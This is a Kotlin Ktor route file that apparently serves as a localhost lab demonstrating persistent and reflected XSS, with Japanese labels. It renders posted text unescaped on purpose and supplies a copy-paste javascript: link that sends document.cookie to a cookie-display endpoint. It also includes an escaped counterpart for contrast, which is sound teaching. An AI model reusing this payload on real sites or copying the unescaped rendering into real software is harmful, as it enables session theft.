package com.example.routes

import io.ktor.http.*
import io.ktor.server.application.*
import io.ktor.server.routing.*
import kotlinx.html.*
import io.ktor.server.html.*
import io.ktor.server.request.*
import io.ktor.server.response.*
import java.io.File

fun Route.xssRoute() {
    get("") {
        call.respondHtml {
            body {
                unsafe {
                    +"<a href=\"javascript: location.href = 'http://localhost:8080/form'\">持続型攻撃</a>\n"
                    +"<br>"
                    +"<br>"
                    +"<a href=\"javascript: location.href = 'http://localhost:8080/blog'\">反射型攻撃</a>\n"
                    +"<br>"
                    +"<br>"
                    +"<a href=\"javascript: location.href = 'http://localhost:8080/href'\">反射型攻撃（即死）</a>\n"
                    +"<br>"
                    +"<br>"
                    +"<a href=\"javascript: location.href = 'http://localhost:8080/form-safe'\">持続型攻撃（エスケープ済み）</a>\n"
                }
            }
        }
    }
    get("/form") {
        call.respondHtml {
            body {
                form(action = "/form", encType = FormEncType.applicationXWwwFormUrlEncoded, method = FormMethod.post) {
                    p {
                        +"投稿内容："
                        textInput(name = "text")
                    }
                    p {
                        submitInput() { value = "投稿する" }
                    }
                    unsafe {
                        +"<br>"
                        +"<br>"
                        +"<br>"
                    }
                    p {
                        +"コピペ用 <a href=\"javascript: location.href = 'http://localhost:8080/showCookie?cookie=' + document.cookie;\">めっちゃ勉強になった記事だった</a>\n"
                    }
                }
            }
        }
    }
    post("/form") {
        val formParameters = call.receiveParameters()
        val text = formParameters["text"].toString()
        call.respondHtml {
            body {
                p {
                    +"コメント1：ラーメン食べたい！"
                }
                p {
                    +"コメント2：電車に乗り過ごした！"
                }
                unsafe {
                    +"コメント3：この<a href='https://hd.finatext.com/'>会社</a>かっこいい！！！"
                }
                unsafe {
                    +"<br>"
                    +"<br>"
                    +"コメント4：$text"
                }
            }
        }
    }

    get("/form-safe") {
        call.respondHtml {
            body {
                form(action = "/form-safe", encType = FormEncType.applicationXWwwFormUrlEncoded, method = FormMethod.post) {
                    p {
                        +"投稿内容："
                        textInput(name = "text")
                    }
                    p {
                        submitInput() { value = "投稿する" }
                    }
                    unsafe {
                        +"<br>"
                        +"<br>"
                        +"<br>"
                    }
                    p {
                        +"コピペ用 <a href=\"javascript: location.href = 'http://localhost:8080/showCookie?cookie=' + document.cookie;\">めっちゃ勉強になった記事だった</a>\n"
                    }
                }
            }
        }
    }
    post("/form-safe") {
        val formParameters = call.receiveParameters()
        val text = formParameters["text"].toString()
        call.respondHtml {
            body {
                p {
                    +"コメント1：ラーメン食べたい！"
                }
                p {
                    +"コメント2：電車に乗り過ごした！"
                }
                unsafe {
                    +"コメント3：この<a href='https://hd.finatext.com/'>会社</a>かっこいい！！！"
                }
                p {
                    +"コメント4：$text"
                }
            }
        }
    }

    get("/blog") {
        val file = File("./static/blog.html")
        call.respondFile(file)
    }

    get("/href") {
        val file = File("./static/href.html")
        call.respondFile(file)
    }

    get("/showCookie") {
        val cookie = call.request.queryParameters["cookie"]?.replace(";", "<br><br><br>")
        val cookieNum = call.request.queryParameters["cookie"]?.split(";")?.size
        call.respondHtml {
            body {
                p {
                    +"ゲットした $cookieNum 個のcookieだよ！"
                }
                unsafe {
                    +"$cookie"
                }
            }
        }
    }
}
